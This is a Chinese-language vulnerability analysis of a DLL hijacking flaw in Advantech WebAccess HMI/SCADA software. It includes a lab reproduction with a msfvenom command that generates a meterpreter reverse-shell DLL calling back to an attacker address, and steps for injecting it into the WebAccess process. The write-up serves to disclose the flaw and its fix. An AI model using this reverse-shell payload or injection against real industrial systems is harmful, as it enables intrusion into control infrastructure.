研华是一家电子平台产品和服务提供商，其业务范围包括完整的系统集成、硬件、软件、以客户为中心的设计服务和后勤支持。研华HMI/SCADA
软件中的WebAccess可以为用户建立一个信息管理平台，同步提高垂直市场管理发展的效率，webaccess存在4个dllhijack漏洞，当bwopctool.dll，bwabout.dll，BwPAlarm.dll，Webvsid.dll自动加载时，Webvrpcs.exe不会校验这些dll，攻击者可以放置恶意的dll文件在该进程的目录中，这些恶意的DLL便会被进程所加载，从而造成代码执行。本文将对次DLL劫持漏洞进行分析。

Part1 漏洞状态

漏洞细节| 漏洞POC| 漏洞EXP| 在野利用  
---|---|---|---  
有| 有| 有| 无  
  
Part2 漏洞描述

AdvantechWebAccess是中国台湾研华（Advantech）公司的一套基于浏览器架构的HMI/SCADA软件。该软件支持动态图形显示和实时数据控制，并提供远程控制和管理自动化设备的功能。Advantech
HMI/SCADA软件webaccess7.2/8.0/8.1存在4个dll
hijack漏洞，当bwopctool.dll，bwabout.dll，BwPAlarm.dll，Webvsid.dll自动加载时，Webvrpcs.exe不会校验这些dll，攻击者可以放置恶意的dll文件在该进程的目录中，对系统进行攻击。

![v2-e075597acd60618e2941fd8024f2bc03_720w.jpg](https://image.3001.net/images/20220324/1648106879_623c1d7f381049d63eb2c.jpg!small)漏洞名称|
HMI/SCADA软件webaccess7.2/8.0/8.1存在4个dll hijack漏洞  
---|---  
CVE编号| CNVD-2016-10337  
漏洞类型| DLL劫持漏洞  
漏洞等级| 低危  
公开状态| 公开  
漏洞描述| HMI/SCADA软件webaccess7.2/8.0/8.1存在4个dll
hijack漏洞，当bwopctool.dll，bwabout.dll，BwPAlarm.dll，Webvsid.dll自动加载时，Webvrpcs.exe不会校验这些dll，攻击者可以放置恶意的dll文件在该进程的目录中，对系统进行攻击。  
  
Part3 漏洞复现

 **1\. 实验环境**

渗透主机：Kali(192.168.33.129)目标主机：windowsxp sp3 (192.168.33.138)软件版本：Advantech
WebAccess 8.0

 **2\. 涉及工具** ProcessExplorer(procexp)DLL-hijackingmetasploit

 **3\. 复现步骤第一步：寻找可劫持进程WebaccessExpress.exe的DLL**

开启进程WebaccessExpress.exe(即Advantech
HMI/SCADA软件，在安装目录下可以找到该执行文件)，打开procexp。其实两者无关先后。在procexp下可以看到WebaccessExpress.exe进程，如下图所示：

![v2-6941168b76d0e2762c536aee79437793_720w.jpg](https://image.3001.net/images/20220324/1648106879_623c1d7f7f61c1906f2c0.jpg!small)

与注册表相对比：

![v2-0cebc3c54277fe6ee90d321677fc1e70_720w.jpg](https://image.3001.net/images/20220324/1648106880_623c1d802df873b642650.jpg!small)

发现bwabout.dll、BwPAlarm.dll等都满足dll劫持的要求，此次选择bwabout.dll。

 **第二步：利用msf基于dll劫持实现反弹shell**

进入kali，检查msfvenom是否正常（在命令行中输入msfvenom）。若正常，则在命令行键入：

msfvenom-p windows/meterpreter/reverse_tcp LHOST=192.168.33.129 LPORT=5555 -f
dll>/root/bwabout.dll

![v2-d2e90bad7410d3cc3a1c11283d564e86_720w.jpg](https://image.3001.net/images/20220324/1648106880_623c1d80a4dd43bde8150.jpg!small)![v2-916de4274762c8d99dcf5456675cafab_720w.jpg](https://image.3001.net/images/20220324/1648106880_623c1d80e85d4ba9a77a6.jpg!small)

之后，会在root下生成需要的bwabout.dll文件，将该文件拷贝到靶机（XP）的桌面。

在Kali命令行中输入msfconsole开启msf，利用msf中的handler模块开启监听：

在靶机中开启进程WebaccessExpress.exe，利用Dllinject.exe，将bwabout.dll注入到进程。这里对bwabout.dll和Dllinject.exe的位置也有要求，将bwabout.dll放在桌面，Dllinject.exe放在其他目录下。

![v2-1117ef7a527a5683566358de7506f890_720w.jpg](https://image.3001.net/images/20220324/1648106881_623c1d8189ce5f0470f95.jpg!small)

找到WebaccessExpress进程，点击注入，注入时要选择bwabout.dll所在位置，其他不用填。回到Kali，发现已经可以获取服务器权限了。

![v2-fa45f752633c701198e1dea10bfdedae_720w.jpg](https://image.3001.net/images/20220324/1648106881_623c1d81d6e398db3ad89.jpg!small)

需要说明的是实际情况下dll劫持能够成功需要一些前提条件，比如需要将恶意dll脚本植入到靶机中并能够成功执行，为了达到这个条件需要利用其他漏洞或方法。

Part4 漏洞修复

将软件升级至8.2或以上版本或者安装补丁文件。

相关链接：https://www.cnvd.org.cn/flaw/show/CNVD-2016-10337

